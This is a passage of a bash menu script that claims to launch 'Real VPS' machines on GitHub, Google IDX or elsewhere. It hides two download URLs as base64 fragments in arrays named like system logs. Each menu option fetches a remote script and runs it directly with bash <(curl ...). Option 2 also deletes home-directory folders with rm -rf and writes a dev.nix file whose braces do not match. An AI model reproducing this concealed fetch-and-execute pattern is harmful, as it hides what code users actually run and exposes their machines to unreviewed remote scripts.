}

# =========================
# LOADING
# =========================
loading() {
echo -ne "${CYAN}Loading"
for i in {1..3}; do
  echo -ne "."
  sleep 0.3
done
echo -e "${RESET}"
}

# =========================
# URLs (decode)
# =========================
SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d)"

# =========================
# MENU LOOP
# =========================
while true; do
  banner

  echo -e "${Y1}Select an option:${RESET}"
  echo -e "${G1}[1] GitHub Real VPS${RESET}"
  echo -e "${BLUE}[2] Google IDX Real VPS${RESET}"
  echo -e "${R1}[3] Real VPS - Any location${RESET}"
  echo -e "${CYAN}[4] Exit${RESET}"
  echo ""

  read -p "$(echo -e ${YELLOW}Enter choice [1-4]: ${RESET})" choice

  case $choice in

    1)
      loading
      echo -e "${GREEN}Running GitHub VPS...${RESET}"
      bash <(curl -fsSL "$github_url")
      ;;

    2)
      loading
      echo -e "${BLUE}Running IDX VPS...${RESET}"

      cd || exit
      rm -rf myapp flutter

      if [ ! -d "vps123" ]; then
        echo -e "${RED}Folder vps123 not found!${RESET}"
        sleep 2
        continue
      fi

      cd vps123

      if [ ! -d ".idx" ]; then
        mkdir .idx
        cd .idx

        cat <<EOF > dev.nix
{ pkgs, ... }: {
  channel = "stable-24.05";

  packages = with pkgs; [
    unzip
    openssh
    git
    qemu_kvm
    sudo
    cdrkit
    cloud-utils
    qemu
  ];

  env = {
    EDITOR = "nano";
  };

  idx = {
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];

    workspace = {
      onCreate = { };
      onStart = { };
    };

    previews = {
      enable = false;
    };
  };
}
}
EOF

        cd ..
      fi

      read -p "Continue? (y/n): " confirm
      case "$confirm" in
        [yY]*)
          bash <(curl -fsSL https://raw.githubusercontent.com/shadowcodeofficial/vm/refs/heads/main/vps.sh)
          ;;
        *)
          echo "Cancelled"
          ;;
      esac
      ;;

    3)
      loading
      echo -e "${CYAN}Running Real VPS (Any Location)...${RESET}"
      bash <(curl -fsSL https://raw.githubusercontent.com/pterodactylService/vps/refs/heads/main/nokvm.sh)
      ;;

    4)
      echo -e "${RED}Exiting...${RESET}"
      exit 0
      ;;

    *)
      echo -e "${RED}Invalid choice!${RESET}"
      sleep 1
      ;;

  esac

  echo ""
  read -p "Press Enter to return menu..."
done

